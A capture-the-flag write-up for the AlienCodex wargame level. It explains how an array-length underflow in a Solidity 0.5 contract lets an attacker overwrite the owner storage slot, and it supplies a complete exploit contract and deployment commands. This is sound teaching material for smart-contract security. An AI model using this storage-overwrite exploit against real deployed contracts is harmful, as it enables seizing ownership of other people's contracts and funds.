# Level 19: AlienCodex Challenge

## Challenge Description

You've uncovered an Alien contract. Claim ownership to complete the level.

Things that might help:
- Understanding how array storage works
- Understanding ABI specifications
- Using a very underhanded approach

## Contract Location

The challenge contract is located at:
```
/contracts/level-19-allien/AlienCodex.sol
```

## Understanding the Challenge

The `AlienCodex` contract is a contract written in Solidity 0.5.0, which inherits from an `Ownable` contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

### Key Observations

1. The contract has a `contact` boolean flag which is initially `false`
2. It has a dynamic array `codex` of `bytes32` values
3. There's a modifier `contacted` that asserts that `contact` is `true`
4. The function `makeContact()` sets `contact` to `true`
5. The function `record()` adds a new element to the `codex` array
6. The function `retract()` decreases the array length by 1
7. The function `revise()` updates an element in the array at a specified index

Our goal is to claim ownership of this contract. Since it inherits from `Ownable`, we need to somehow update the `owner` variable to our own address.

## Winning Strategy

The key to solving this challenge involves understanding Solidity storage layout and exploiting a vulnerability in Solidity 0.5.0, which doesn't have overflow/underflow protection.

1. **Storage Layout**: In a contract, each variable is stored sequentially in 32-byte slots, starting from slot 0. For dynamic arrays, the length is stored at the array's slot, and the array data starts at `keccak256(slot)`.

2. **The Vulnerability**: The `retract()` function decreases the array length by 1 without any bounds checking. In Solidity 0.5.0, if we call `retract()` on an empty array, it will cause an underflow, making the array length appear to be 2^256-1.

3. **The Exploit**: With the array length set to 2^256-1, we can access any storage slot in the contract through the `revise()` function. Since the `owner` variable is inherited from `Ownable` and is at slot 0, we can calculate the array index that would map to slot 0 and overwrite it with our address.

## Hint for Thinking

Ask yourself:
* How are variables laid out in contract storage?
* What happens when you call `retract()` on an empty array in Solidity 0.5.0?
* How can you use an array with a manipulated length to access and modify any storage slot?
* Which storage slot contains the owner address?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

### Understanding Storage Layout

In Ethereum, contract storage is a key-value mapping where each slot is 32 bytes. Storage slots are assigned sequentially to state variables:

1. The `owner` variable from the `Ownable` contract is at slot 0
2. The `contact` boolean is at slot 0 as well (booleans only take 1 byte, so it shares the slot with `owner`)
3. The `codex` array's length is stored at slot 1
4. The elements of `codex` start at the storage slot given by `keccak256(1)`

### The Vulnerability

The vulnerability is in the `retract()` function:

```solidity
function retract() public contacted {
    codex.length--;
}
```

In Solidity 0.5.0, there's no overflow/underflow protection. If we call `retract()` on an empty array, the length will underflow from 0 to 2^256-1, giving us access to the entire storage space via array indices.

### The Exploit

Our exploit involves:

1. Calling `makeContact()` to set `contact` to true, allowing us to pass the `contacted` modifier
2. Calling `retract()` on an empty array to underflow the length to 2^256-1
3. Calculating the array index that maps to storage slot 0 (where the owner is stored)
4. Using `revise()` to overwrite the owner address at that index

```solidity
// Calculating the index for storage slot 0
// We need to find i where: keccak256(1) + i = 0 (mod 2^256)
// So i = 0 - keccak256(1) (mod 2^256)
uint256 arraySlot = 1;
uint256 arrayIndex = uint256(2**256 - 1) - uint256(keccak256(abi.encode(arraySlot))) + 1;

// Overwrite the owner address
codex.revise(arrayIndex, bytes32(uint256(uint160(msg.sender))));
```

### Implementation Details

The solution contract, `AlienCodexExploit`, implements the logic to claim ownership:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function owner() external view returns (address);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexExploit {
    address public alienCodex;
    address public owner;

    constructor(address _alienCodex) {
        alienCodex = _alienCodex;
        owner = msg.sender;
    }
    
    function exploit(address _newOwner) external {
        require(msg.sender == owner, "Not the owner");
        IAlienCodex codex = IAlienCodex(alienCodex);
        
        // Step 1: Call makeContact to pass the contacted modifier
        codex.makeContact();
        
        // Step 2: Call retract() to underflow the array length
        // This makes the array length 2^256-1, so we can access any storage slot
        codex.retract();
        
        // Step 3: Calculate the index to overwrite the owner slot
        // The owner variable is inherited from the Ownable contract and is at slot 0
        // The codex array is at slot 1 (contact is a bool at slot 0 with the owner)
        // We need to find i where keccak256(1) + i = 0 (mod 2^256)
        // This means i = 0 - keccak256(1) (mod 2^256)
        uint256 arraySlot = 1;
        uint256 arrayIndex = uint256(2**256 - 1) - uint256(keccak256(abi.encode(arraySlot))) + 1;
        
        // Step 4: Use revise to overwrite the owner address at the calculated index
        // We need to convert the address to bytes32, padding with zeros on the left
        codex.revise(arrayIndex, bytes32(uint256(uint160(_newOwner))));
    }

    // Function to check if the exploit worked by reading the owner
    function checkOwner() external view returns (address) {
        return IAlienCodex(alienCodex).owner();
    }
}
```

### Execution Steps

1. **Deploy the AlienCodex Contract**:
   ```shell
   npx hardhat deploy --tags alien-codex --network sepolia
   ```

2. **Deploy the AlienCodexExploit Contract**:
   ```shell
   TARGET_ADDRESS=0xYourAlienCodexAddress npx hardhat deploy --tags alien-codex-solution --network sepolia
   ```

3. **Execute the Exploit**:
   ```shell
   ALIEN_CODEX_EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xYourAlienCodexAddress npx hardhat run scripts/level-19-alien-codex/execute-alien-codex-exploit.ts --network sepolia
   ```

## Key Insights

1. **Storage Layout Understanding**: This challenge demonstrates the importance of understanding how Solidity stores variables in contract storage, especially the storage pattern for dynamic arrays.

2. **Version-Specific Vulnerabilities**: Solidity 0.5.0 doesn't have built-in overflow/underflow protection, which creates security vulnerabilities. This was fixed in Solidity 0.8.0 with automatic overflow/underflow checks.

3. **Array Length Manipulation**: The exploit relies on manipulating array length through an underflow, which gives access to the entire storage space. This highlights the risks of unchecked arithmetic operations.

4. **Storage Collision**: Being able to access the entire storage allows us to overwrite any variable, including inherited ones like the `owner` address from the `Ownable` contract.

5. **Importance of Range Checking**: Always implement proper bounds checking on array operations, especially in versions of Solidity before 0.8.0.
